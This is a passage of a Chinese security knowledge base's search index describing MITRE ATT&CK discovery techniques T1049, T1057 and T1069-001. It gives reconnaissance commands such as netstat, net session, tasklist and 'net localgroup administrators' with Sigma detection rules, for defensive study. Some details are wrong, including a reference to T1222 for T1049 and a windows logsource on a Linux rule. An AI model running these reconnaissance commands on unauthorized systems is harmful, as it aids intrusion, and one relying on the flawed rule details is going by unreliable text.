\u83b7\u5f97\u5bf9\u57fa\u4e8e\u4e91\u73af\u5883\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u89c4\u5212\u51fa\u865a\u62df\u79c1\u6709\u4e91\u6216\u865a\u62df\u7f51\u7edc\uff0c\u4ee5\u4fbf\u786e\u5b9a\u8fde\u63a5\u4e86\u54ea\u4e9b\u7cfb\u7edf\u548c\u670d\u52a1\u3002\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6240\u6267\u884c\u7684\u64cd\u4f5c\u53ef\u80fd\u662f\u76f8\u540c\u7c7b\u578b\u7684\u53d1\u73b0\u6280\u672f\uff0c\u4f46\u662f\u6240\u5f97\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u6709\u5173\u4e0e\u653b\u51fb\u8005\u76ee\u6807\u76f8\u5173\u7684\u8054\u7f51\u4e91\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u4e91\u63d0\u4f9b\u5546\u53ef\u80fd\u5177\u6709\u4e0d\u540c\u7684\u865a\u62df\u7f51\u7edc\u64cd\u4f5c\u65b9\u5f0f\u3002 \u6d4b\u8bd5\u6848\u4f8b windows \u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5b9e\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u5305\u62ecnetstat\uff0c\u201cnet use\u201d\u548c\u4e0e\u201cnet session\u201d\u3002 Mac\u548clinux \u5728Mac\u548cLinux\uff0cnetstat\u5e76\u4e14lsof\u53ef\u4ee5\u7528\u6765\u5217\u8868\u5f53\u524d\u8fde\u63a5\u3002who -a\u5e76\u4e14w\u53ef\u4ee5\u7528\u6765\u663e\u793a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u7c7b\u4f3c\u4e8e\u201c\u7f51\u7edc\u4f1a\u8bdd\u201d\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\Administrator>netstat \u6d3b\u52a8\u8fde\u63a5 \u534f\u8bae \u672c\u5730\u5730\u5740 \u5916\u90e8\u5730\u5740 \u72b6\u6001 C:\\Users\\Administrator>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002 C:\\Users\\Administrator>net session \u5217\u8868\u662f\u7a7a\u7684\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7cfb\u7edf\u7f51\u7edc\u94fe\u63a5\u53d1\u73b0 description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md tags: T1049 status: experimental author: 12306Bro logsource: product: windows service: security/sysmon detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Commandline: - netstat - net use - net sessions selection2: keywords: - Get-NetTCPConnection #powershell condition: all of them level: medium title: linux\u7f51\u7edc\u4fe1\u606f\u53d1\u73b0 description: ubuntu 18.0.4 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md tags: T1049 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: keywords: - netstat - who -a condition: all of them level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1049 https://attack.mitre.org/techniques/T1222/","title":"T1049-\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#t1049-","text":"","title":"T1049-\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002 \u83b7\u5f97\u5bf9\u57fa\u4e8e\u4e91\u73af\u5883\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u89c4\u5212\u51fa\u865a\u62df\u79c1\u6709\u4e91\u6216\u865a\u62df\u7f51\u7edc\uff0c\u4ee5\u4fbf\u786e\u5b9a\u8fde\u63a5\u4e86\u54ea\u4e9b\u7cfb\u7edf\u548c\u670d\u52a1\u3002\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6240\u6267\u884c\u7684\u64cd\u4f5c\u53ef\u80fd\u662f\u76f8\u540c\u7c7b\u578b\u7684\u53d1\u73b0\u6280\u672f\uff0c\u4f46\u662f\u6240\u5f97\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u6709\u5173\u4e0e\u653b\u51fb\u8005\u76ee\u6807\u76f8\u5173\u7684\u8054\u7f51\u4e91\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u4e91\u63d0\u4f9b\u5546\u53ef\u80fd\u5177\u6709\u4e0d\u540c\u7684\u865a\u62df\u7f51\u7edc\u64cd\u4f5c\u65b9\u5f0f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_1","text":"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#windows","text":"\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5b9e\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u5305\u62ecnetstat\uff0c\u201cnet use\u201d\u548c\u4e0e\u201cnet session\u201d\u3002","title":"windows"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#maclinux","text":"\u5728Mac\u548cLinux\uff0cnetstat\u5e76\u4e14lsof\u53ef\u4ee5\u7528\u6765\u5217\u8868\u5f53\u524d\u8fde\u63a5\u3002who -a\u5e76\u4e14w\u53ef\u4ee5\u7528\u6765\u663e\u793a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u7c7b\u4f3c\u4e8e\u201c\u7f51\u7edc\u4f1a\u8bdd\u201d\u3002","title":"Mac\u548clinux"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_3","text":"C:\\Users\\Administrator>netstat \u6d3b\u52a8\u8fde\u63a5 \u534f\u8bae \u672c\u5730\u5730\u5740 \u5916\u90e8\u5730\u5740 \u72b6\u6001 C:\\Users\\Administrator>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002 C:\\Users\\Administrator>net session \u5217\u8868\u662f\u7a7a\u7684\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7cfb\u7edf\u7f51\u7edc\u94fe\u63a5\u53d1\u73b0 description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md tags: T1049 status: experimental author: 12306Bro logsource: product: windows service: security/sysmon detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Commandline: - netstat - net use - net sessions selection2: keywords: - Get-NetTCPConnection #powershell condition: all of them level: medium title: linux\u7f51\u7edc\u4fe1\u606f\u53d1\u73b0 description: ubuntu 18.0.4 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md tags: T1049 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: keywords: - netstat - who -a condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1049 https://attack.mitre.org/techniques/T1222/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/","text":"T1057-win-\u8fdb\u7a0b\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u83b7\u5f97\u7684\u4fe1\u606f\u53ef\u7528\u4e8e\u4e86\u89e3\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u901a\u7528\u8f6f\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8fc7\u7a0b\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 windows \u4f7f\u7528tasklist\u5b9e\u7528\u7a0b\u5e8f\u83b7\u5f97\u8fdb\u7a0b\u8be6\u7ec6\u4fe1\u606f\u7684\u793a\u4f8b\u547d\u4ee4\u662f\u201ctasklist\u201d\u3002 Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u662f\u901a\u8fc7ps\u547d\u4ee4\u5b8c\u6210\u7684\u3002 \u7c7b\u4f3c\u4e8eT1603-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\uff0c\u5177\u4f53\u6d4b\u8bd5\u6848\u4f8b\u53ca\u8be6\u7ec6\u4fe1\u606f\u53ef\u53c2\u8003T1063\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u672c\u5730\u6267\u884cTasklist \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma-win\u89c4\u5219 title: windows\u672c\u5730\u6267\u884cTasklist description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md tags: T1057 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\windows\\system32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tasklist #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low sigma-linux\u89c4\u5219 title: linux\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0 description: linux ps\u547d\u4ee4\u5b9e\u73b0\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md tags: T1057 status: experimental author: 12306Bro logsource: product: linux detection: selection: keywords: - ps - ps aux condition: selection level: low \u5efa\u8bae \u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u770b\u8d77\u6765\u50cf\u8fdb\u7a0b\u53d1\u73b0\u7684\u6b63\u5e38\u3001\u826f\u6027\u7684\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u5e76\u4e0d\u5e38\u89c1\uff0c\u8fd9\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u5b83\u4eec\u7684\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1057 https://attack.mitre.org/techniques/T1057/ MITRE-ATT&CK-T1063 https://attack.mitre.org/techniques/T1063/","title":"T1057-win-\u8fdb\u7a0b\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#t1057-win-","text":"","title":"T1057-win-\u8fdb\u7a0b\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u83b7\u5f97\u7684\u4fe1\u606f\u53ef\u7528\u4e8e\u4e86\u89e3\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u901a\u7528\u8f6f\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8fc7\u7a0b\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 windows \u4f7f\u7528tasklist\u5b9e\u7528\u7a0b\u5e8f\u83b7\u5f97\u8fdb\u7a0b\u8be6\u7ec6\u4fe1\u606f\u7684\u793a\u4f8b\u547d\u4ee4\u662f\u201ctasklist\u201d\u3002 Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u662f\u901a\u8fc7ps\u547d\u4ee4\u5b8c\u6210\u7684\u3002 \u7c7b\u4f3c\u4e8eT1603-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\uff0c\u5177\u4f53\u6d4b\u8bd5\u6848\u4f8b\u53ca\u8be6\u7ec6\u4fe1\u606f\u53ef\u53c2\u8003T1063\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_1","text":"windows\u672c\u5730\u6267\u884cTasklist","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 linux\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#sigma-win","text":"title: windows\u672c\u5730\u6267\u884cTasklist description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md tags: T1057 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\windows\\system32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tasklist #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low","title":"sigma-win\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#sigma-linux","text":"title: linux\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0 description: linux ps\u547d\u4ee4\u5b9e\u73b0\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md tags: T1057 status: experimental author: 12306Bro logsource: product: linux detection: selection: keywords: - ps - ps aux condition: selection level: low","title":"sigma-linux\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_6","text":"\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u770b\u8d77\u6765\u50cf\u8fdb\u7a0b\u53d1\u73b0\u7684\u6b63\u5e38\u3001\u826f\u6027\u7684\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u5e76\u4e0d\u5e38\u89c1\uff0c\u8fd9\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u5b83\u4eec\u7684\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1057 https://attack.mitre.org/techniques/T1057/ MITRE-ATT&CK-T1063 https://attack.mitre.org/techniques/T1063/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/","text":"T1069-001-win-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u672c\u5730\u7cfb\u7edf\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u8f83\u9ad8\u7684\u6743\u9650\uff0c\u4f8b\u5982\u5728\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u627e\u5230\u7684\u7528\u6237\u3002 Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet localgroup\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7ec4\u3002dscl . -list /Groupsgroups \u6d4b\u8bd5\u6848\u4f8b \u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 windows DOS\u547d\u4ee4\uff1anet user / net localgroup administrators \u6d4b\u8bd5\u7559\u75d5 windwos \u5b89\u5168\u65e5\u5fd7 4799/4798(\u6ce8\u610f\uff1a\u6b64\u4e8b\u4ef6\u65e5\u5fd7\u4ec5\u9650\u4e8ewindows server 2016/win10\u4ee5\u4e0a\u7248\u672c) \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: 